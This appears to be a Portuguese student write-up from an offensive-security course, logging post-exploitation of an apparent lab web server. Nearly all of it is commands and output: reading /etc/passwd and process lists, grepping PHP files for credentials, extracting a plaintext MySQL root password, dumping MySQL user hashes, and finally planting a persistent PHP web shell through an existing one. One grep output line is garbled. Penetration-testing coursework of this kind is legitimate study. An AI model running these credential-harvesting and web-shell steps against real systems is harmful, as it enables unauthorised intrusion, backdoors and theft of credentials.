# 🔍 Exploração do Site — 👨‍🔬 Penetratium ☢️ - 🧬 Team 📡

## 🔗 Materia Segurança Ofensiva 📕

- 👨‍🏫 **Professor:** JPGress
- 🔍 **Tipo:** Exploration

---

## Comando : cat /etc/passwd
```
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  libuuid:x:100:101::/var/lib/libuuid:
  syslog:x:101:104::/home/syslog:/bin/false
  mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
  messagebus:x:103:107::/var/run/dbus:/bin/false
  landscape:x:104:110::/var/lib/landscape:/bin/false
  sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
  business:x:1000:1000:business,,,:/home/business:/bin/bash
```

## comando : ps aux

``` 
  USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
  root         1  0.0  0.8  33480  4048 ?        Ss   06:28   0:01 /sbin/init
  root         2  0.0  0.0      0     0 ?        S    06:28   0:00 [kthreadd]
  root         3  0.0  0.0      0     0 ?        S    06:28   0:01 [ksoftirqd/0]
  root         5  0.0  0.0      0     0 ?        S<   06:28   0:00 [kworker/0:0H]
  root         7  0.0  0.0      0     0 ?        S    06:28   0:05 [rcu_sched]
  root         8  0.0  0.0      0     0 ?        S    06:28   0:00 [rcu_bh]
  root         9  0.0  0.0      0     0 ?        S    06:28   0:00 [migration/0]
  root        10  0.0  0.0      0     0 ?        S    06:28   0:00 [watchdog/0]
  root        11  0.0  0.0      0     0 ?        S    06:28   0:00 [kdevtmpfs]
  root        12  0.0  0.0      0     0 ?        S<   06:28   0:00 [netns]
  root        13  0.0  0.0      0     0 ?        S<   06:28   0:00 [perf]
  root        14  0.0  0.0      0     0 ?        S    06:28   0:00 [khungtaskd]
  root        15  0.0  0.0      0     0 ?        S<   06:28   0:00 [writeback]
  root        16  0.0  0.0      0     0 ?        SN   06:28   0:00 [ksmd]
  root        17  0.0  0.0      0     0 ?        S<   06:28   0:00 [crypto]
  root        18  0.0  0.0      0     0 ?        S<   06:28   0:00 [kintegrityd]
  root        19  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        20  0.0  0.0      0     0 ?        S<   06:28   0:00 [kblockd]
  root        21  0.0  0.0      0     0 ?        S<   06:28   0:00 [ata_sff]
  root        22  0.0  0.0      0     0 ?        S<   06:28   0:00 [md]
  root        23  0.0  0.0      0     0 ?        S<   06:28   0:00 [devfreq_wq]
  root        25  0.0  0.0      0     0 ?        S    06:28   0:00 [kworker/0:1]
  root        27  0.0  0.0      0     0 ?        S    06:28   0:00 [kswapd0]
  root        28  0.0  0.0      0     0 ?        S<   06:28   0:00 [vmstat]
  root        29  0.0  0.0      0     0 ?        S    06:28   0:00 [fsnotify_mark]
  root        30  0.0  0.0      0     0 ?        S    06:28   0:00 [ecryptfs-kthrea]
  root        46  0.0  0.0      0     0 ?        S<   06:28   0:00 [kthrotld]
  root        47  0.0  0.0      0     0 ?        S<   06:28   0:00 [acpi_thermal_pm]
  root        48  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        49  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        50  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        51  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        52  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        53  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        54  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        55  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        56  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        57  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        58  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        59  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        60  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        61  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        62  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        63  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        64  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        65  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        66  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        67  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        68  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        69  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        70  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        71  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root        72  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_0]
  root        73  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_0]
  root        74  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_1]
  root        75  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_1]
  root        81  0.0  0.0      0     0 ?        S<   06:28   0:00 [ipv6_addrconf]
  root        94  0.0  0.0      0     0 ?        S<   06:28   0:00 [deferwq]
  root        95  0.0  0.0      0     0 ?        S<   06:28   0:00 [charger_manager]
  root       150  0.0  0.0      0     0 ?        S    06:28   0:00 [kworker/0:2]
  root       151  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_2]
  root       152  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_2]
  root       153  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_3]
  root       154  0.0  0.0      0     0 ?        S<   06:28   0:00 [mpt_poll_0]
  root       155  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_3]
  root       156  0.0  0.0      0     0 ?        S<   06:28   0:00 [kpsmoused]
  root       157  0.0  0.0      0     0 ?        S<   06:28   0:00 [mpt/0]
  root       158  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_4]
  root       159  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_4]
  root       160  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_5]
  root       161  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_5]
  root       162  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_6]
  root       163  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_6]
  root       164  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_7]
  root       165  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_7]
  root       166  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_8]
  root       167  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_8]
  root       168  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_9]
  root       171  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_9]
  root       172  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_10]
  root       173  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_10]
  root       174  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_11]
  root       175  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_11]
  root       176  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_12]
  root       177  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_12]
  root       178  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_13]
  root       179  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_13]
  root       180  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_14]
  root       181  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_14]
  root       182  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_15]
  root       183  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_15]
  root       184  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_16]
  root       185  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_16]
  root       186  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_17]
  root       187  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_17]
  root       188  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_18]
  root       189  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_18]
  root       190  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_19]
  root       191  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_19]
  root       192  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_20]
  root       193  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_20]
  root       194  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_21]
  root       195  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_21]
  root       196  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_22]
  root       197  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_22]
  root       198  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_23]
  root       199  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_23]
  root       200  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_24]
  root       201  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_24]
  root       202  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_25]
  root       203  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_25]
  root       204  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_26]
  root       205  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_26]
  root       206  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_27]
  root       207  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_27]
  root       208  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_28]
  root       209  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_28]
  root       210  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_29]
  root       211  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_29]
  root       212  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_30]
  root       213  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_30]
  root       214  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_31]
  root       215  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_31]
  root       243  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_32]
  root       244  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_32]
  root       245  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
  root       270  0.0  0.0      0     0 ?        S    06:28   0:01 [jbd2/sda1-8]
  root       271  0.0  0.0      0     0 ?        S<   06:28   0:00 [ext4-rsv-conver]
  root       315  0.0  0.0      0     0 ?        S<   06:28   0:00 [kworker/0:1H]
  root       410  0.0  0.5  20284  2848 ?        S    06:28   0:00 upstart-udev-bridge --daemon
  root       416  0.0  0.8  52296  4216 ?        Ss   06:28   0:00 /lib/systemd/systemd-udevd --daemon
  root       480  0.0  0.0      0     0 ?        S<   06:28   0:00 [ttm_swap]
  message+   507  0.0  0.4  39116  2124 ?        Ss   06:28   0:00 dbus-daemon --system --fork
  root       583  0.0  0.6  43452  3324 ?        Ss   06:28   0:00 /lib/systemd/systemd-logind
  syslog     668  0.0  0.5 255844  2984 ?        Ssl  06:28   0:00 rsyslogd
  root       805  0.0  0.4  16072  2340 ?        S    06:28   0:00 upstart-file-bridge --daemon
  root       813  0.0  0.3  15528  1840 ?        S    06:28   0:00 upstart-socket-bridge --daemon
  root       939  0.0  0.4  15820  2068 tty4     Ss+  06:28   0:00 /sbin/getty -8 38400 tty4
  root       942  0.0  0.3  15820  1992 tty5     Ss+  06:28   0:00 /sbin/getty -8 38400 tty5
  root       947  0.0  0.4  15820  2008 tty2     Ss+  06:28   0:00 /sbin/getty -8 38400 tty2
  root       948  0.0  0.4  15820  2036 tty3     Ss+  06:28   0:00 /sbin/getty -8 38400 tty3
  root       951  0.0  0.3  15820  1976 tty6     Ss+  06:28   0:00 /sbin/getty -8 38400 tty6
  root       985  0.0  1.0  61380  5268 ?        Ss   06:28   0:00 /usr/sbin/sshd -D
  daemon     988  0.0  0.0  19140   160 ?        Ss   06:28   0:00 atd
  root       989  0.0  0.4  23656  2320 ?        Ss   06:28   0:00 cron
  root      1155  0.0  0.3   4372  1624 ?        Ss   06:28   0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
  mysql     1162  0.0  9.5 887444 47736 ?        Ssl  06:28   0:05 /usr/sbin/mysqld
  root      1194  0.0  4.3 278588 21940 ?        Ss   06:28   0:01 /usr/sbin/apache2 -k start
  root      1242  0.0  0.7  78188  3572 tty1     Ss   06:28   0:00 /bin/login --     
  root      1346  0.0  0.0      0     0 ?        S    06:33   0:00 [kauditd]
  root      1394  0.0  1.0  22360  5100 tty1     S+   06:33   0:00 -bash
  root      1888  0.0  0.0      0     0 ?        S    09:20   0:00 [kworker/u2:2]
  www-data  3258  0.0  2.6 278876 13404 ?        S    10:40   0:00 /usr/sbin/apache2 -k start
  www-data  3261  0.0  2.6 278868 13244 ?        S    10:40   0:00 /usr/sbin/apache2 -k start
  www-data  3264  0.0  2.6 279068 13488 ?        S    10:41   0:00 /usr/sbin/apache2 -k start
  www-data  3272  0.0  2.6 278876 13244 ?        S    10:41   0:00 /usr/sbin/apache2 -k start
  www-data  3274  0.0  2.6 278876 13180 ?        S    10:41   0:00 /usr/sbin/apache2 -k start
  www-data  3276  0.0  2.7 279060 13580 ?        S    10:41   0:00 /usr/sbin/apache2 -k start
  www-data  3278  0.0  2.6 279068 13264 ?        S    10:42   0:00 /usr/sbin/apache2 -k start
  www-data  3279  0.0  2.6 278868 13332 ?        S    10:42   0:00 /usr/sbin/apache2 -k start
  www-data  3280  0.0  2.6 279060 13360 ?        S    10:42   0:00 /usr/sbin/apache2 -k start
  www-data  3281  0.0  2.6 279068 13508 ?        S    10:42   0:00 /usr/sbin/apache2 -k start
  root      3302  0.0  0.0      0     0 ?        S    10:52   0:00 [kworker/u2:1]
  www-data  3330  0.0  0.1   4448   796 ?        S    11:07   0:00 sh -c ps aux
  www-data  3331  0.0  0.4  15568  2204 ?        R    11:07   0:00 ps aux
  ```

## comando : netstat -tulpn
```
  Active Internet connections (only servers)
  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
  tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -               
  tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
  tcp6       0      0 :::80                   :::*                    LISTEN      -               
```

## comando : cat /var/www/html/BANCO\ DE\ DADOS/bd.sql
```
  -- MySQL dump 10.13  Distrib 5.1.63, for debian-linux-gnu (i486)
  --
  -- Host: localhost    Database: cfp
  -- ------------------------------------------------------
  -- Server version	5.1.63-0+squeeze1
  
  /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
  /*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
  /*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
  /*!40101 SET NAMES utf8 */;
  /*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
  /*!40103 SET TIME_ZONE='+00:00' */;
  /*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
  /*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
  /*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
  /*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
  
  --
  -- Table structure for table `submissions`
  --
  
  DROP TABLE IF EXISTS `submissions`;
  /*!40101 SET @saved_cs_client     = @@character_set_client */;
  /*!40101 SET character_set_client = utf8 */;
  CREATE TABLE `submissions` (
    `id` mediumint(9) NOT NULL AUTO_INCREMENT,
    `email` varchar(150) DEFAULT NULL,
    `password` varchar(50) DEFAULT NULL,
    `title` varchar(150) DEFAULT NULL,
    `description` text,
    `bio` text,
    `filename` varchar(150) DEFAULT NULL,
    PRIMARY KEY (`id`)
  ) ENGINE=MyISAM DEFAULT CHARSET=latin1;
  /*!40101 SET character_set_client = @saved_cs_client */;
  
  --
  -- Dumping data for table `submissions`
  --
  
  LOCK TABLES `submissions` WRITE;
  /*!40000 ALTER TABLE `submissions` DISABLE KEYS */;
  /*!40000 ALTER TABLE `submissions` ENABLE KEYS */;
  UNLOCK TABLES;
  /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
  
  /*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
  /*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
  /*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
  /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
  /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
  /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
  /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
  
  -- Dump completed on 2017-01-09 23:37:44
```
## comando : find /var/www/html -name "*.php" -exec grep -l "mysql_connect\|password\|user" {} \;

```
  /var/www/html/prog/submission.php
  /var/www/html/prog/auth.php
  /var/www/html/prog/db.php
  /var/www/html/submit.php
  /var/www/html/login.php
```
## comando : grep -r "password\|user\|mysql" /var/www/html --include="*.php"

<img width="886" height="701" alt="image" src="https://github.com/user-attachments/assets/1fab406b-967f-459d-b9e1-78572f951425" />

---

## comando :grep -n "mysql_connect\|password\|user" /var/www/html/prog/submission.php

```
  4:  public $id, $title, $email, $password, $description, $bio, $filename, $admin;
  5:  function __construct($id, $title, $email, $password, $description, $bio, $filename ){
  9:    $this->password = $password;
  18:                          $row['password'], $row['description'],
  24:      $sql .= "' and password='";
  25:      $sql .= mysql_real_escape_string( $_POST["password"]);
  121:      $sql = "INSERT INTO submisn/bash\ndaemon:x:1:1:daemon:/usrsions (email,password,";
  127:      $password = mysql_real_escape_string( $_POST["password"]);
  132:      $sql .= $email."','".$password."','".$title."','".$description."','";
```

## comando : ls -la /var/www/html/prog/

```
    total 28
    drwxr-xr-x  2 www-data www-data 4096 Sep 18 11:30 .
    drwxr-xr-x 12 www-data www-data 4096 Sep 19 10:58 ..
    -rw-r--r--  1 www-data www-data  391 Sep 18 11:03 auth.php
    -rw-r--r--  1 www-data www-data  117 Sep 18 11:30 db.php
    -rw-r--r--  1 www-data www-data   69 Sep 18 11:03 php.php
    -rw-r--r--  1 www-data www-data 4194 Sep 18 11:03 submission.php
```
## comando : mysql --version

```
mysql  Ver 14.14 Distrib 5.5.50, for debian-linux-gnu (x86_64) using readline 6.3
```


## comando : cat /var/www/html/prog/db.php
```
  <!--?php
  
      $lnk = @mysql_connect("localhost", "root", "dbhacklfi");
      $db = mysql_select_db('deseclfi', $lnk);
  
  ?--> 


```
# CREDENCIAIS DO BANCO DE DADOS encontradas ( ROOT )

---

## comando : mysql -u root -pdbhacklfi -e "show databases;"

```
  Database
  information_schema
  deseclfi
  mysql
  performance_schema
```

## comando : mysql -u root -pdbhacklfi -e "use deseclfi; show tables;"

```
  Tables_in_deseclfi
  submissions
```
## comando: mysql -u root -pdbhacklfi -e "use mysql; show tables;"

``` 
Tables_in_mysql
columns_priv
db
event
func
general_log
help_category
help_keyword
help_relation
help_topic
host
ndb_binlog_index
plugin
proc
procs_priv
proxies_priv
servers
slow_log
tables_priv
time_zone
time_zone_leap_second
time_zone_name
time_zone_transition
time_zone_transition_type
user

```


## comando : mysql -u root -pdbhacklfi -e "use mysql; select user, host, password from user;"
```
  user	host	password
  root	localhost	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
  root	rh	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
  root	127.0.0.1	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
  root	::1	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
  debian-sys-maint	localhost	*300DD417C72920F12EBD3A01236771655230AC5A
```

Criar shell via web shell:
bash
http://rh.businesscorp.com.br/web_shell.php?cmd=echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/admin.php
Acessar:
bash
http://rh.businesscorp.com.br/admin.php?cmd=whoami
